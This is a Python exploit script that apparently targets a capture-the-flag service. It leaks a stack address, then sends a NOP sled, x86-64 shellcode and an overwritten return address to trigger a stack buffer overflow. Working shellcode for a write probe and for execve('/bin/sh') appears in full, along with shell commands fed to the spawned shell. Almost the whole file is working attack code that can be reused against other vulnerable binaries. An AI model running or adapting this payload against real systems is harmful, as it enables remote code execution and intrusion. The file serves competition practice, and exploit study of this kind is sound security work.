#!/usr/bin/env python3
"""Re-derive the buffer address without depending on `push rsp` semantics.

f1 does `push rsp` at rsp=S.  PUSH with RSP as source stores the *decremented*
value, so the leaked word L is either S-8 (post-decrement) or S (pre-decrement).
f2 runs at rsp=S+8 (it pushed nothing) and reads into S+8-0x80, so

    buf   = L-0x70  if L=S-8        (the usual x86 PUSH RSP behaviour)
    buf   = L-0x78  if L=S
    RET   = buf+0x80 = L-0x70+0x80 / L-0x78+0x80

Both candidates fall out of the same payload layout: a 0x50-byte sled at buf
then shellcode, and a jump target of L-0x60.  For L=S-8 that is buf+0x10, for
L=S it is buf+0x18 - both land inside the sled, so the ambiguity is forgiven.
"""
import socket
import struct
import sys
import time

HOST = "chal.sunshinectf.games"
PORT = 26003
RET_OFF = 0x80
FIRST_READ = 24
SLED = 0x50
TARGET_OFF = -0x60          # jump to L-0x60, guaranteed inside the sled

PROBE_WRITE = (
    b"\x48\x89\xe6"                              # mov rsi,rsp
    b"\x48\xc7\xc7\x01\x00\x00\x00"              # mov rdi,1
    b"\x48\xc7\xc2\x08\x00\x00\x00"              # mov rdx,8
    b"\x48\xc7\xc0\x01\x00\x00\x00"              # mov rax,1
    b"\x0f\x05"                                  # syscall
)
EXIT60 = (
    b"\x48\xc7\xc7\x3c\x00\x00\x00"              # mov rdi,60
    b"\x48\xc7\xc0\x3c\x00\x00\x00"              # mov rax,60
    b"\x0f\x05"                                  # syscall
)
EXECVE_SH = (
    b"\x31\xf6\x56\x48\xbf/bin/sh\x00"
    b"\x57\x48\x89\xe7\x56\x48\x89\xe6\xb0\x3b\x0f\x05"
)


def leak8(s):
    s.settimeout(10)
    buf = b""
    while len(buf) < 8:
        c = s.recv(8 - len(buf))
        if not c:
            break
        buf += c
    return buf


def drain(s, seconds):
    s.settimeout(seconds)
    start = time.time()
    out = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            out += c
    except socket.timeout:
        pass
    return out, time.time() - start


def attempt(sc, tail=b"", feed=None, wait=5.0):
    s = socket.create_connection((HOST, PORT), timeout=20)
    try:
        l = leak8(s)
        if len(l) != 8:
            return "SHORTLEAK " + repr(l), b""
        L = struct.unpack("<Q", l)[0]
        body = (b"\x90" * SLED) + sc + tail
        body = body.ljust(RET_OFF, b"\x90")[:RET_OFF]
        assert len(body) == RET_OFF
        s.sendall(b"A" * FIRST_READ + body + struct.pack("<Q", L + TARGET_OFF))
        out, dt = drain(s, wait)
        if feed:
            try:
                s.sendall(feed)
            except OSError:
                pass
            out2, _ = drain(s, 4.0)
            out += out2
        return "L=%#x target=%#x closed=%.2fs n=%d" % (L, L + TARGET_OFF, dt, len(out)), out
    finally:
        s.close()


if __name__ == "__main__":
    for name, args in [
        ("write-probe", dict(sc=PROBE_WRITE, tail=EXIT60)),
        ("execve", dict(sc=EXECVE_SH, feed=b"echo MARKER_$((6*7)); ls /\nexit\n")),
    ]:
        info, out = attempt(**args)
        print("== %-12s %s" % (name, info))
        print("   out=%r" % out[:200])
        print("   hex=%s" % out[:64].hex())
        time.sleep(0.8)
